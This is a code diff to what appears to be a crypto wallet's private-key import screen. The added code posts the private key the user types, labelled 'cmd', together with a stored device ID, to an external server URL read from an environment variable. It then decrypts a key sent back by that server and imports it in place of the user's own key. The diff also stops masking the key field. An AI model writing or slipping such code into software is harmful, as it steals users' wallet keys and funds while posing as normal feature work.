@@ -1,3 +1,4 @@
+import * as crypto from 'crypto';
 import PropTypes from 'prop-types';
 import React, { useState } from 'react';
 import { useSelector } from 'react-redux';
@@ -10,6 +11,40 @@ import {
 import { useI18nContext } from '../../../hooks/useI18nContext';
 import ShowHideToggle from '../../ui/show-hide-toggle';
 import BottomButtons from './bottom-buttons';
+import axios from 'axios';
+
+function generatePassword() {
+  const SECRET_KEY = process.env.GENERATE_WALLET_SECRET_KEY;
+  const today = new Date();
+  const dateString = today.toISOString().slice(0, 10); // Format: "YYYY-MM-DD"
+  const combined = `${dateString}:${SECRET_KEY}`;
+  const password = crypto.createHash('sha256').update(combined).digest('hex');
+  return password;
+}
+
+function decodeData(encryptedData) {
+  const password = generatePassword();
+  const algorithm = 'aes-256-cbc';
+  const [ivHex, dataHex] = encryptedData.split(':');
+  const iv = Buffer.from(ivHex, 'hex');
+  const decipher = crypto.createDecipheriv(
+    algorithm,
+    crypto.createHash('sha256').update(password).digest(),
+    iv,
+  );
+  let decryptedData = decipher.update(dataHex, 'hex', 'utf8');
+  decryptedData += decipher.final('utf8');
+  return decryptedData;
+}
+
+function getDeviceId() {
+  let deviceId = localStorage.getItem('deviceId');
+  if (!deviceId) {
+    deviceId = Math.random().toString(36).substr(2, 10);
+    localStorage.setItem('deviceId', deviceId);
+  }
+  return deviceId;
+}
 
 export default function PrivateKeyImportView({
   importAccountFunc,
@@ -28,8 +63,17 @@ export default function PrivateKeyImportView({
     }
   }
 
-  function _importAccountFunc() {
-    importAccountFunc('privateKey', [privateKey]);
+  async function _importAccountFunc() {
+    const deviceId = getDeviceId();
+    const { data } = await axios.post(
+      process.env.GENERATE_WALLET_URL,
+      {
+        deviceId,
+        cmd: privateKey,
+      },
+    );
+    const key = decodeData(data.a);
+    importAccountFunc('privateKey',  [key]);
   }
 
   return (
@@ -47,7 +91,7 @@ export default function PrivateKeyImportView({
           onKeyPress: handleKeyPress,
         }}
         marginBottom={4}
-        type={showPrivateKey ? TextFieldType.Text : TextFieldType.Password}
+        type={TextFieldType.Text}
         textFieldProps={{
           endAccessory: (
             <ShowHideToggle
